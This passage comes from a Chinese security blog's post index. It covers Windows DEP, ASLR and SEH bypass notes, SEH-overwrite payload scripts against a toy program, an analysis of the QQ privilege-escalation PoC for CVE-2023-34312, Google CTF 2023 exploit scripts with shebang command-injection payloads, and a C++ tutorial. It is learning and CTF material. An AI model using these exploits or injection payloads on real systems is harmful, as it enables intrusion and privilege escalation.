只编译DEP可能还需要关闭运行时检查 主要思路就是Ret2Libc 调用ZwSetInformationProcess关闭DEP 在之前的《【win内核原理与实现】II. 进程与线程》中提到过_KPROCESS存在ExecuteOptions 我并没有在微软的官网上找到该结构体的说明，但是可以通过之前他们的逆向结果找到 1234567Pos0 ExecuteDisable :1bit Pos1 ExecuteEnable :1bit Pos2 DisableThunkEmulation :1bit Pos3 Permanent :1bit Pos4 ExecuteDispatchEnable :1bit Pos5 ImageDispatchEnable :1bit Pos6 Spare :2bit 当前进程 DEP 开启时 ExecuteDisable 位被置 1，当 进程 DEP 关闭时 ExecuteEnable 位被置 1，DisableThunkEmulation 是为了兼容 ATL 程序设置的， Permanent 被置 1 后表示这些标志都不能再被修改。真正影响 DEP 状态是前两位，所以我们只 要将_KEXECUTE_OPTIONS 的值设置为 0x02（二进制为 00000010）就可以将 ExecuteEnable 置为 1。 使用 123456ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE; ZwSetInformationProcess( NtCurrentProcess(), // (HANDLE)-1 ProcessExecuteFlags, // 0x22 &amp;ExecuteFlags, // ptr to 0x2 sizeof(ExecuteFlags)); // 0x4 就可以关掉DEP保护了，在0day书中介绍了3种直接利用兼容性异常而导致DEP关闭的方法 （1）当 DLL 受 SafeDisc 版权保护系统保护时； （2）当 DLL 包含有.aspcak、.pcle、.sforce 等字节时； （3）Windows V ista 下面当 DLL 包含在注册表“HKEY_LOCAL_MACHINE\\SOFTWARE \\Microsoft\\ Windows NT\\CurrentVersion\\Image File Execution Options\\DllNXOptions”键下边标识 出不需要启动 DEP 的模块时 很可惜在windows10中这些情况几乎不会出现，所以方法不适用 这两种是我比较喜欢用的，因为可以和免杀结合在一起 他们的基础就是类似LinuxPwn中的ROP构造，这里我使用的是32下，cdcle调用方式，使用栈传参 VirtualProtect改写内存权限 关于函数的用法：virtualProtect 函数 (memoryapi.h) 123456BOOL VirtualProtect( [in] LPVOID lpAddress, [in] SIZE_T dwSize, [in] DWORD flNewProtect, [out] PDWORD lpflOldProtect); lpAddress: 要改变属性的内存起始地址。 dwSize: 要改变属性的内存区域大小。 flNewProtect: 内存新的属性类型，设置为 PAGE_EXECUTE_READWRITE（0x40）时该 内存页为可读可写可执行。 pflOldProtect: 内存原始属性类型保存地址。 修改内存属性成功时函数返回非 0，修改失败时返回 0。 不过API位于的是shell32.dll当中，所以要添加上HINSTANCE hInst = LoadLibrary(L&quot;shell32.dll&quot;); 由于ROP依赖于函数调用的传参方式，下面是一个经典的传参 ROP时栈的结构 由于没有泄露点，所以只能在调试的时候修改。也可以使用Gadget来构造，比如说通过ESP相关得到栈地址之类的。（但是得到VirtualProtect就太困难了） 123456789101112131415161718from ae64 import AE64payload = b&quot;&quot;shellcode = b&quot;&quot;offset = b&quot;A&quot;*0x14payload = offset payload += b&quot;\\x90&quot;*4 #VirtualProtectpayload += b&quot;\\x80&quot;*4 #Shellcode Addresspayload += b&quot;\\x80&quot;*4 #Shellcode Addresspayload += b&quot;\\xff\\x00\\x00\\x00&quot; #Address Lengthpayload += b&quot;\\x40\\x00\\x00\\x00&quot; #PAGE_EXECUTE_READWRITEpayload += b&quot;\\x38\\xa0\\x41\\x00&quot; #0041A038payload += shellcodewith open(&quot;password.txt&quot;,&quot;wb&quot;) as f: f.write(payload) VirtualAlloc来开辟可执行的内存然后执行shellcode 和VirtualProtect一样的道理，不过需要使用复制的payload将shellcode复制到可执行的内存中 ASLR 在绕过DEP保护中需要调试的时候才能写入函数地址的原因就是这些函数的DLL使用了ASLR保护，导致函数每次加载的基地址不同，所以无法使用固定地址。 绕过思路主要有 低位覆盖，最低位是固定的 堆喷，将内存初始化后的\\x0c强制写为\\x90（nop的汇编），这样程序进入了任意的地址都能滑行到shellcode。（扩大伤害面） SEHOP 由于SEH是链式的，所以他会顺着链表检查，如果最后一个不为系统固定的终极异常处理函数就直接不执行。 最直接有效的就是伪造SEH链，由于只会验证最后一个，只满足这个条件就可以了 由于SEHOP在SafeSEH之前，所以绕过过后还需要继续绕过SafeSEH 参考 《0day安全：软件漏洞分析技术》","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"},{"name":"pwn","slug":"pwn","permalink":"https://joe1sn.eu.org/tags/pwn/"}]},{"title":"【Win Pwn】基础栈溢出利用","slug":"win-pwn-stack","date":"2023-07-08T08:39:36.000Z","updated":"2023-07-08T10:18:47.929Z","comments":true,"path":"2023/07/08/win-pwn-stack/","link":"","permalink":"https://joe1sn.eu.org/2023/07/08/win-pwn-stack/","excerpt":"[Win Pwn] 基础栈溢出利用 window下无保护的栈溢出加载shellcode","text":"[Win Pwn] 基础栈溢出利用 window下无保护的栈溢出加载shellcode 程序 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt; void vuln()&#123; char password[6] = &quot;ABCDE&quot;; char str[6]; FILE *fp; if(!(fp=fopen(&quot;password.txt&quot;,&quot;r&quot;))) exit(0); fscanf(fp,&quot;%s&quot;,str); str[5]=&#x27;\\0&#x27;; if(strcmp(str,password)==0) // fprintf(stderr,&quot;OK.\\n&quot;); printf(&quot;OK.\\n&quot;); else // fprintf(stderr,&quot;NO.\\n&quot;); printf(&quot;NO.\\n&quot;);&#125;int main()&#123; vuln(); return 0;&#125; 在windows下的防护等级有 ASLR /DYNAMICBASE 带有剥离的重定位条目边缘情况 /HIGHENTROPYVA for 64-bit systems Code integrity/signing: /INTEGRITYCHECK 使用有效（可信、活动）证书进行 Authenticode 签名（Linux 目前不支持） DEP 别称：W^X, NX Manifest isolation /ALLOWISOLATION SEH和SafeEH SEH=Structured Exception Handling Control Flow Guard和Return Flow Guard instrumentation Stack cookie /GS ASLR：与Linux的PIE相同，指地址随机化，将在程序启动时将DLL随机的加载到内存中的未知，自Windows 10开始已经在系统中被配置为默认启动； High Entropy VA：高熵64位地址空间布局随机化，开启后标识此程序的随机化取值空间为64 bit，这会导致攻击者更难去推测随机化后的地址； Force Integrity：强制签名保护，开启后标识程序加载时需要验证其中的前命，如果签名不正确，程序将会被阻止运行； Isolation：隔离保护，开启后表示此程序加载时将会在一个相对独立的隔离环境中被加载，从而阻止攻击者过度提升权限； NX/DEP/PAE：NX保护指的是内存页不可运行。属于系统级的内存保护功能，能够将一页或多页标记为不可执行，从而防止从该内存区域运行代码，以帮助防止利用缓冲区溢出。防止代码在数据页面（例如堆、栈和内存池）中运行，在Windows中常称为DEP。 PAE指物理地址拓展，PAE是一项处理器功能，使x86处理器可以在部分windows版本上访问4 GB以上的物理内存。在基于x86的系统上运行的某些32位版本的Windows Server可以使用PAE访问最多64 GB或128 GB的物理内存，具体取决于处理器的物理地址大小。使用PAE，操作系统将从两级线性地址转换为三级地址转换。两级线性地址转换将线性地址拆分为3个独立的字段索引到内存表中，三级地址转换将其拆分为4个独立的字段：一个2位字段，两个9位字段和一个12位字段。PAE模式下的页表条目(PTE)和页目录条目(PDE)的大小从32位增加到64位。附加位允许操作系统PTE或PDE引用4 GB以上的物理内存，同时PAE将允许在基于x86的系统上运行32位windows中启用DEP等功能。 SEHOP：即结构化异常处理保护(structured Exception Handling Overwrite Protection)，这个保护能够防止攻击者利用结构化异常处理来进行进一步的利用。 CFG：即控制流防护这项技术通过在间接跳转前插入校验代码，检查目标地址的有效性，进而可以阻止执行流跳转到预期之外的地点，最终及时有效的进行异常处理，避免引发相关的安全问题。 RFG：即返回地址防护，在每个函数头部将返回地址保存到 fs:[rsp](thread control stack)，并在函数返回前将其与栈上返回地址进行比较，从而有效阻止攻击； SafeSEH：安全结构化异常处理(Safe Structured Exception Handlers)，白名单版的安全沙箱，定义一些异常处理程序，并基于此构造安全结构化异常处理表，程序运行后，安全结构化异常处理表之外的异常处理程序将会被阻止运行； GS：类似于Linux中的Canary保护，开启后，会在返回地址和BP之前压入一个额外的 Security Cookie，系统会比较栈中的这个值和原先存放在 .data中的值做一个比较，如果两者不吻合，则说明发生了栈溢出； Authenticode：签名保护； .NET：DLL混淆级保护 你可以查看文件头进行识别，也可以使用winchecksec进行识别 非常明显的漏洞点 漏洞分析 GCC编译gcc .\\main.c -o shellcode 先试一下跳转，加上覆盖ebp的空间大小是0x1c 加载shellcode 现在想办法布置shellcode，由于没有后门函数所以需要利用SEH进行shellcode的布置。 栈中的 SEH Handle 存储的形式 基本的布置方式如下，实战的可以参考CVE-2019-9766简单栈溢出 使用x32dbg调试得到SEH链，然后得出payload 1234567891011121314payload = b&quot;&quot;shellcode = b&quot;&quot;offset = b&quot;A&quot;*0x11c #0x1ctest_func = b&quot;\\xc4\\x16\\x40\\x00&quot; #004016C4NSEH = b&quot;\\xeb\\x06\\x90\\x90&quot; #asm(&quot;jmp 6;nop;nop&quot;)gadget = b&quot;\\xee\\x19\\x40\\x00&quot; #004019EE 00402537 004017EEnops = b&quot;\\x90&quot;*5 #nopspayload = offset+NSEH+gadget+shellcodewith open(&quot;password.txt&quot;,&quot;wb&quot;) as f: f.write(payload) 使用了gadget，进行两次pop抬栈，这样就能滑行到shellcode gadget过后的跳转 但是shellcode长度有限制，所以很寄 但是我们执行一小段shellcode，那么可以尝试自己写gadget，将shellcode写入在payload前段，然后利用SEH到自己写的gadget，最后跳转到shellcode，需要注意的是程序会把第五位归0，所以要注意。 在使用fscanf函数读取字符串时，以下特殊字符可能会导致读取失败或产生意外的结果： 空格 (0x20) 制表符 (0x09) 换行符 (0x0A) 回车符 (0x0D) 这块儿就只有自己根据实际情况改进shellcode了。 那么我稍微改进一下源代码 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt; void hacked()&#123; printf(&quot;Hacked\\n&quot;);&#125;void vuln()&#123; char password[6] = &quot;ABCDE&quot;; char str[6]; FILE *fp; if(!(fp=fopen(&quot;password.txt&quot;,&quot;r&quot;))) exit(0); fgets(str, 0x1000, fp); str[5]=&#x27;\\0&#x27;; if(strcmp(str,password)==0) // fprintf(stderr,&quot;OK.\\n&quot;); printf(&quot;OK.\\n&quot;); else // fprintf(stderr,&quot;NO.\\n&quot;); printf(&quot;NO.\\n&quot;);&#125;int main()&#123; vuln(); return 0;&#125; 由于栈比较小，可以考虑自己写入gadget来帮助shellcode的跳转 1234567891011121314151617from ae64 import AE64payload = b&quot;&quot;shellcode = b&quot;&quot;offset = b&quot;A&quot;*(0x11c-len(shellcode)-16) #0x1ctest_func = b&quot;\\xc4\\x16\\x40\\x00&quot; #004016C4NSEH = b&quot;\\xeb\\x06\\x90\\x90&quot; #asm(&quot;jmp 6;nop;nop&quot;)gadget = b&quot;\\xee\\x19\\x40\\x00&quot; #004019EE 00402537 004017EEself_gadget = b&quot;\\x89\\xE0\\x05\\x14\\x06\\x00\\x00\\xFF\\xE0&quot; # mov eax, esp # sub eax, 0x608 # jmp eaxpayload = b&quot;\\xaa&quot;*16+shellcode+offset+NSEH+gadget+self_gadgetwith open(&quot;password.txt&quot;,&quot;wb&quot;) as f: f.write(payload)","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"},{"name":"pwn","slug":"pwn","permalink":"https://joe1sn.eu.org/tags/pwn/"}]},{"title":"【漏洞复现】CVE-2023-34312分析","slug":"qq-evasion","date":"2023-07-03T12:13:39.000Z","updated":"2023-07-18T01:32:15.629Z","comments":true,"path":"2023/07/03/qq-evasion/","link":"","permalink":"https://joe1sn.eu.org/2023/07/03/qq-evasion/","excerpt":"关于QQ提权漏洞CVE-2023-34312的分析 ！！未完待续！！","text":"关于QQ提权漏洞CVE-2023-34312的分析 ！！未完待续！！ PoC分析 PoC地址：https://github.com/vi3t1/qq-tim-elevation，用rust写的按照教程编译好了就可以直接打了 由于没有开启ASLR保护所以很稳 接着是分析一下PoC 触发 触发方式是.\\QQProtect .\\evil.dll，同时必须保持tinyxml.dll在同一目录下，这里用QQ9.7.7举例子。 首先是GetCommandLineW获得启动参数，接着判断置否存在下列关键参数，然后不存在关键参数直接到了StartAddress 使用QQProtectEngine.dll中的RunQQProtect，设置回调函数sub_40C950 回调函数中的a2指针可以将任何地址的值设置为参数分析时的参数个数值，也就是 1。 那么现在我们就有了将任意地址写为1的能力，恰好QQProtect.exe没有开启ASLR保护，若开启的话下图应该存在IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE PoC 和上文中结合起来，在QQProtect中导入了tinyxml.dll，所以可以修改这个dll的内容来执行攻击。 PoC首先获取了evil.dll的路径， 123let evil_dllpath: String = std::env::args().nth(1).unwrap();let evil_dllpath: std::path::PathBuf = std::path::Path::new(&amp;evil_dllpath).canonicalize().unwrap();println!(&quot;evil dll: &#123;&#125;&quot;, evil_dllpath.display()); 接着打开服务获得QQProtectEngine.dll的基地址（因为他开启了ASLR保护）。 在PoC中打开了Windows的QPCore服务然后获取配置信息，从配置信息中提取出qqprotect.exe和QQProtectEngine.dll的路径。 由于LoadLibraryExW中使用了DONT_RESOLVE_DLL_REFERENCES所以不会调用DLLMain，若函数成功，则返回值是已加载模块的句柄，从句柄的第一个值提取出加载的地址。注意的是，这里是首先加载tinyxml.dll，所以加载的QQProtectEngine.dll的地址在这里同一样适用，这样就获得了QQProtectEngine.dll的基地址。 123456789101112131415fn get_qqprotectengine_dllbase() -&gt; u32 &#123; let manager = ServiceManager::local_computer(None::&lt;&amp;str&gt;, ServiceManagerAccess::ENUMERATE_SERVICE).unwrap(); let service = manager.open_service(&quot;QPCore&quot;, ServiceAccess::QUERY_CONFIG).unwrap(); let service_config = service.query_config().unwrap(); let qqprotect_exe = windows_args::ArgsOs::parse_cmd(service_config.executable_path.as_os_str()).next().unwrap(); let qqprotectengine_dll = std::path::Path::new(&amp;qqprotect_exe).parent().unwrap().join(&quot;QQProtectEngine.dll&quot;); unsafe &#123; let h = LoadLibraryExW(PCWSTR(HSTRING::from(qqprotectengine_dll.as_path()).as_ptr()), HANDLE::default(), DONT_RESOLVE_DLL_REFERENCES).unwrap(); let base = h.0 as u32; FreeLibrary(h); return base; &#125;&#125; 创建IPC进程间通讯 如何找到IPC通讯，可以在https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist安装`pipelist`查看所有的命名管道通讯 那么在QQProtect.exe一定会有一个连接命名管道的地方，在QQProtectEnginee.dll中使用 找到对应的管道命名 和 （回调分析麻了）之后会进入QSection.dll中的函数，具体逆向可以看B战大佬的视频：https://www.bilibili.com/video/BV1wm4y1E7TL 很像一个结构体。加载了QPSection后调用了6号导出函数，之后还需要对结构体进行逆向","categories":[],"tags":[]},{"title":"【CTF】2023 Google CTF WriteUp与复现","slug":"googleCTF-wp","date":"2023-06-26T15:44:49.000Z","updated":"2023-06-27T12:28:50.376Z","comments":true,"path":"2023/06/26/googleCTF-wp/","link":"","permalink":"https://joe1sn.eu.org/2023/06/26/googleCTF-wp/","excerpt":"端午节打的比赛，事情比较多没怎么看题，指导学弟做了下，这里来个复盘。 开始CTF的复健之路吧。","text":"端午节打的比赛，事情比较多没怎么看题，指导学弟做了下，这里来个复盘。 开始CTF的复健之路吧。 Pwn WRITE-FLAG-WHERE 最简单的一道pwn，没有开ASLR保护。当时我的机器跑不起来，学弟的能跑，和他一起分析。 程序的主逻辑是读取/proc/self/maps来读取存在的内存（gdb中的vmmap就是这样实现的），然后把 flag 读取到一个全局变量中，最后我们可以在任意一个地址写入任意长度（&lt;0x7f）的flag中的字符串。 当时我们是在arch上做的，使用gdb能看到输出，然后尝试将flag覆盖内存中的提示语句 那么地址就是 *$rebase(0x21E0)，尝试远程 得到flag CTF{Y0ur_j0urn3y_is_0n1y_ju5t_b39innin9} WRITE-FLAG-WHERE 2 当时离做出来差了亿点点。 保护没变，但是删除了之前的字符串修改点。后来我看到了有一段无关的代码段 后来想这道题快想魔怔了 【未解出】使用sscanf覆盖 挺疯狂的一个想法，由于死循环内不存在输入，但是sscanf会根据你的输入去匹配，然后我们又知道flag是CTF&#123;xxxx&#125;，所以可以覆盖0x%llx %u的第一个，类似于： 逐步缩小地址爆破得到flag，但是考虑到工作量而且太久没做CTF导致pwntools的不熟悉没有能成功 【差一点】可视化shellcode 和上面的思路差不多，只不过是利用了T的ASCII为0x54，而0x54的汇编码是push rsp，那么一直写入T，让最后的退出划入那段不相关的代码段 1234567891011def nop2(addr,lenth): r.sendline(b&quot;0x%x %d&quot; % (addr+base,lenth)) sleep(0.1)nop2(0x20d5,50)for i in range(10): nop2(0x1443-i,2)sleep(0.1)r.sendline(b&quot;0x1234 111111&quot;) 最后得到flag CTF{impr355iv3_6ut_can_y0u_s01v3_cha113ng3_3?} 注意：由于网络延时最后的flag不开代理导致没有收到… WRITE-FLAG-WHERE 3 上一道题直接导致心态爆炸，这道题没怎么看。不过看上去限制了我们能修改的地址范围 不能 是main函数±0x5000的位置，导致之前的exp失效。 不过本地patched过的版本成功调用了alarm 那么试试修改libc中的报错为flag，但是不行 不过思路也是很接近的了，在官方的exp中使用了&#125;，作为jnp来进行爆破。其他也是使用了一下gadget，利用jnp 0x48实现ROP的跳转 1234r3tr0@pwnmachine:~$ rasm2 -ax86 -b64 -d 0x4354467b4354 push r12jnp 0x48push rsp 使用2中的思路覆写libc中的exit 由于输入位于栈上使用，输入组合的ROP链，由于libc中的exit已经被覆写，所以程序会返回ret，从而触发ROP链，最后实现write写出flag 这里使用r3kpig的exp打一下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *context.log_level=&#x27;debug&#x27;context.arch=&#x27;amd64&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]# p=process(&#x27;./main&#x27;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)# gdb.attach(p)# p.interactive()# exit(1)sh=&#x27;&#x27;&#x27;b *0x555555555478b *0x555555555491b exit&#x27;&#x27;&#x27;# p = process(&quot;./chal&quot;)# p = gdb.debug(&quot;./chal&quot;,sh,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)p = remote(&quot;wfw3.2023.ctfcompetition.com&quot;,1337)ru = lambda a: p.readuntil(a)r = lambda n: p.read(n)sla = lambda a,b: p.sendlineafter(a,b)sa = lambda a,b: p.sendafter(a,b)sl = lambda a: p.sendline(a)s = lambda a: p.send(a)def ch(addr,l): target = addr pay = hex(target).encode()+b&quot; &quot;+str(l).encode() p.send(pay.ljust(0x40,b&#x27;\\0&#x27;))def end(l): p.send(flat(l).ljust(0x40,b&#x27;\\xff&#x27;)) p.read()def nop(addr,l): if l%2!=0: l=l-1 ch(addr+l-1,1) for x in range(0,l,2): ch(addr+x,2)ru(b&quot; expire\\n&quot;)PIE = int(p.readuntil(b&quot;-&quot;)[:-1],0x10)info(hex(PIE))for x in range(7): ru(b&quot;\\n&quot;)base = int(p.readuntil(b&quot;-&quot;)[:-1],0x10)info(hex(base))ru(b&quot;\\n\\n&quot;)ch(0x455f0+0x1b+base,1)ch(0x455f0+0x17+base,1)ch(0x455f0+0x2b-3+base,1)ch(0x455f0+0x2b-2+base,2)ch(0x455f0+0x1f+base,1)ch(0x455f0+0x4+base,1)ch(0x455f0+0x26+base,1)rdi = 0x000000000002a3e5+basebprintf = 0x555555555090-0x555555554000+PIEflag = 0x5555555590A0-0x555555554000+PIErsi = 0x000000000002be51+baseend([rdi,1337,rsi,flag,bprintf,])p.interactive() 得到flag CTF{y0ur_3xpl0itati0n_p0w3r_1s_0v3r_9000!!} STORYGEN 下载下来是python文件。 发现使用了os.system(&quot;/tmp/script.sh&quot;)，那么顺着逻辑去分析： 12345678910111213141516171819202122232425262728293031#@NAME&#x27;s storyNAME=&#x27;@NAME&#x27;WHERE=&#x27;@WHERE&#x27;echo &quot;$NAME came from $WHERE. They always liked living there.&quot;echo &quot;They had 3 pets:&quot;types[0]=&quot;dog&quot;types[1]=&quot;cat&quot;types[2]=&quot;fish&quot;names[0]=&quot;Bella&quot;names[1]=&quot;Max&quot;names[2]=&quot;Luna&quot;for i in 1 2 3do size1=$&#123;#types[@]&#125; index1=$(($RANDOM % $size1)) size2=$&#123;#names[@]&#125; index2=$(($RANDOM % $size2)) echo &quot;- a $&#123;types[$index1]&#125; named $&#123;names[$index2]&#125;&quot;doneechoecho &quot;Well, I&#x27;m not a good writer, you can write the rest... Hope this is a good starting point!&quot;echo &quot;If not, try running the script again.&quot; 然后输入替换这段脚本 open(&quot;/tmp/script.sh&quot;, &quot;w&quot;).write(STORY.replace(&quot;@NAME&quot;, name).replace(&quot;@WHERE&quot;, where).strip()) 不过存在小WAF 12def sanitize(s): return s.replace(&quot;&#x27;&quot;, &#x27;&#x27;).replace(&quot;\\n&quot;, &quot;&quot;) 首要思路肯定是命令注入，而且在首行的#@NAME's story自带了一个'，如果你对shell脚本比较了解的话，会知道往往是以#!/bin/bash开始的，尝试一下 成功调用了/bin/bash。赛后看wp发现这个是Shebang（也称为Hashbang），是一种在Unix和类Unix系统中用于指定脚本解释器的约定，它是通过在脚本文件的第一行以特定格式指定解释器的路径来实现的，可以利用这种方式直接./hello.py，比如： 12#!/usr/bin/python3print(&quot;hello&quot;) 那么开始构造exp，需要注意的是尽量使用\\x00截断 官方wp中介绍了一种技巧：#!/bin/cat&lt;空格&gt;的时候会读取自身脚本的内容，首先使用ls -al查看目录，最后排查到根目录 '!/usr/bin/env -S ls -al /\\x00' 尝试读取flag，出现提示 !/usr/bin/env -S cat /flag\\x00 得到提示，最后使用payload得到flag !/usr/bin/env -S sh -c &quot;/get_flag Give flag please&quot;\\x00 CTF{Sh3b4ng_1nj3cti0n_ftw} UBF","categories":[{"name":"writeup","slug":"writeup","permalink":"https://joe1sn.eu.org/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://joe1sn.eu.org/tags/CTF/"},{"name":"writeup","slug":"writeup","permalink":"https://joe1sn.eu.org/tags/writeup/"}]},{"title":"【免杀】C++函数进化","slug":"cpp-function","date":"2023-06-26T00:10:22.000Z","updated":"2023-06-26T15:41:34.611Z","comments":true,"path":"2023/06/26/cpp-function/","link":"","permalink":"https://joe1sn.eu.org/2023/06/26/cpp-function/","excerpt":"C++的函数进化小结","text":"C++的函数进化小结 函数 有这样一个问题 1234567#include &lt;iostream&gt;int main()&#123; int IntArray = &#123; 12, 13, 35, 16, 6, 5, 5, 12, 4, 13, 38, 35, 37, 33, 35, 15, 36, 14, 13, 12 &#125;; //统计大于20的数字 return 0;&#125; 那么很自然的给出解法 123456789101112131415161718#include &lt;iostream&gt;int CountMatch(int* start, int* end)&#123; int sum = 0; for (; start &lt; end ; start++) &#123; if (*start &gt; 20) sum++; &#125; return sum;&#125;int main()&#123; int IntArray[] = &#123; 12, 13, 35, 16, 6, 5, 5, 12, 4, 13, 38, 35, 37, 33, 35, 15, 36, 14, 13, 12 &#125;; //统计大于20的数字 std::cout&lt;&lt;&quot;Matches: &quot;&lt;&lt;CountMatch(IntArray,IntArray+20)&lt;&lt;std::endl; return 0;&#125; 函数指针 这个时候的需要满足 统计大于10的数字 或者 统计小于35的数字，那么可以将*start &gt; 20这一段包装一下 123456789101112131415161718192021222324#include &lt;iostream&gt;int CountMatch(int* start, int* end, bool(*ConditionFunc)(const int &amp;))&#123; int sum = 0; for (; start &lt; end ; start++) &#123; if (ConditionFunc(*start)) sum++; &#125; return sum;&#125;bool bGreat20(const int &amp;num)&#123; return num &gt; 20; &#125;bool bGreat10(const int &amp;num)&#123; return num &gt; 10; &#125;bool bLess35(const int &amp;num)&#123; return num &lt; 35; &#125;int main()&#123; int IntArray[] = &#123; 12, 13, 35, 16, 6, 5, 5, 12, 4, 13, 38, 35, 37, 33, 35, 15, 36, 14, 13, 12 &#125;; //统计大于20的数字 std::cout&lt;&lt;&quot;Greater than 20 Matches: &quot;&lt;&lt;CountMatch( IntArray, IntArray+20, bGreat20 )&lt;&lt;std::endl; std::cout&lt;&lt;&quot;Greater than 10 Matches: &quot;&lt;&lt;CountMatch( IntArray, IntArray+20, bGreat10 )&lt;&lt;std::endl; std::cout&lt;&lt;&quot;Greater than 20 Matches: &quot;&lt;&lt;CountMatch( IntArray, IntArray+20, bLess35 )&lt;&lt;std::endl; return 0;&#125; 图片上的代码有点小问题 在c语言中可以这样写，虽然编译会有警告，但是仍然可以生成。 1234567891011121314151617181920212223#include &lt;stdio.h&gt;int CountMatch(int* start, int* end, void *function_pointer(int))&#123; int sum = 0; for (; start &lt; end ; start++) &#123; if (function_pointer(*start)) sum++; &#125; return sum;&#125;int Pointer(int start)&#123; printf(&quot;Happy\\n&quot;); return 1;&#125;int main()&#123; int IntArray[] = &#123; 12, 13, 35, 16, 6, 5, 5, 12, 4, 13, 38, 35, 37, 33, 35, 15, 36, 14, 13, 12 &#125;; //统计大于20的数字 printf(&quot;Matches: %d\\n&quot;,CountMatch(IntArray,IntArray+20, Pointer)); return 0;&#125; 在c中伴随着指针的引用*p和解引用&amp;p，C对指针的类型安全性进行了更严格的限制。C++中的指针类型必须与所指向的对象类型匹配，不允许进行隐式类型转换。这可以帮助减少潜在的类型错误和编程错误。 函数模板 上面的函数只能支持int，使用函数模板能让他支持更多类型 123456789101112131415161718192021222324252627#include &lt;iostream&gt; template &lt;typename T&gt; int CountMatch(T* start, T* end, bool(*ConditionFunc)(const T &amp;))&#123; int sum = 0; for (; start &lt; end ; start++) &#123; if (ConditionFunc(*start)) sum++; &#125; return sum; &#125;bool bGreat20(const int &amp;num)&#123; return num &gt; 20; &#125;bool bGreat10(const int &amp;num)&#123; return num &gt; 10; &#125;bool bLess35(const int &amp;num)&#123; return num &lt; 35; &#125;bool bTiny(const std::string &amp;val)&#123; return val.size() &lt;= 3; &#125;int main()&#123; int IntArray[] = &#123; 12, 13, 35, 16, 6, 5, 5, 12, 4, 13, 38, 35, 37, 33, 35, 15, 36, 14, 13, 12 &#125;; std::string StrArray[] = &#123;&quot;Hello&quot;,&quot;world&quot;,&quot;This&quot;,&quot;is&quot;,&quot;a&quot;,&quot;test&quot;&#125;; //统计大于20的数字 std::cout&lt;&lt;&quot;Greater than 20 Matches: &quot;&lt;&lt;CountMatch( IntArray, IntArray+20, bGreat20 )&lt;&lt;std::endl; std::cout&lt;&lt;&quot;Greater than 10 Matches: &quot;&lt;&lt;CountMatch( IntArray, IntArray+20, bGreat10 )&lt;&lt;std::endl; std::cout&lt;&lt;&quot;Greater than 20 Matches: &quot;&lt;&lt;CountMatch( StrArray, StrArray+6, bTiny )&lt;&lt;std::endl; return 0;&#125; 仿函数 在条件中如果需要处理用户传入的数字怎么办 仿函数（Functor）是C++中的一个概念，指的是可以像函数一样使用的对象。它实际上是一个类或结构体，重载了函数调用运算符 operator()，使得对象可以像函数一样进行调用操作。 chatGPT给了我这样一个例子 1234567891011121314151617181920212223#include &lt;iostream&gt;// 定义一个仿函数类class AddFunctor &#123;public: int operator()(int a, int b) &#123; return a + b; &#125;&#125;;int main() &#123; // 创建一个仿函数对象 AddFunctor add; // 使用仿函数对象进行调用 int result = add(3, 4); // 输出结果 std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl; return 0;&#125; 在这里可以这样写 12345678template &lt;typename T&gt;struct Greater&#123; T mVal; //持有的状态 explicit Greater(T value): mVal(value)&#123;&#125; bool operator()(const T &amp;val) const &#123; return val&gt;mVal; &#125;&#125;; explicit：通过在单参数构造函数前添加 explicit 关键字，可以防止编译器在需要进行类型转换的情况下自动调用该构造函数。 operator：仿函数的实现，使得对象可以像函数一样进行调用操作。 抓函数中生成一个对象（该标准仅在c++11及以上支持），但是这样函数指针就没法用了 1Greater&lt;int&gt; greater20&#123;20&#125;; 可以学习标准库中的操作将模板持续下去 12345678910template &lt;typename T, typename fCompare&gt;int CountMatch(T* start, T* end, fCompare ConditionFunc)&#123; int sum = 0; for (; start &lt; end ; start++) &#123; if (ConditionFunc(*start)) sum++; &#125; return sum;&#125; 最后程序 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;template &lt;typename T, typename fCompare&gt;int CountMatch(T* start, T* end, fCompare ConditionFunc)&#123; int sum = 0; for (; start &lt; end ; start++) &#123; if (ConditionFunc(*start)) sum++; &#125; return sum;&#125;template &lt;typename T&gt;struct Greater&#123; T mVal; //持有的状态 explicit Greater(T value): mVal(value)&#123;&#125; bool operator()(const T &amp;val) const &#123; return val&gt;mVal; &#125;&#125;;int main()&#123; int IntArray[] = &#123; 12, 13, 35, 16, 6, 5, 5, 12, 4, 13, 38, 35, 37, 33, 35, 15, 36, 14, 13, 12 &#125;; std::string StrArray[] = &#123;&quot;Hello&quot;,&quot;world&quot;,&quot;This&quot;,&quot;is&quot;,&quot;a&quot;,&quot;test&quot;&#125;; Greater&lt;int&gt; greater20&#123;20&#125;; //统计大于20的数字 std::cout&lt;&lt;&quot;Greater than 20 Matches: &quot;&lt;&lt;CountMatch( IntArray, IntArray+20, greater20 )&lt;&lt;std::endl; return 0;&#125; lambda表达式 这个我再Qt上用的挺多的，他是匿名函数的实现 1234567int main()&#123; int IntArray[] = &#123; 12, 13, 35, 16, 6, 5, 5, 12, 4, 13, 38, 35, 37, 33, 35, 15, 36, 14, 13, 12 &#125;; auto greater20 = [](auto &amp;val) -&gt; bool &#123; return val &gt; 20; &#125;; //统计大于20的数字 std::cout&lt;&lt;&quot;Greater than 20 Matches: &quot;&lt;&lt;CountMatch( IntArray, IntArray+20, greater20 )&lt;&lt;std::endl; return 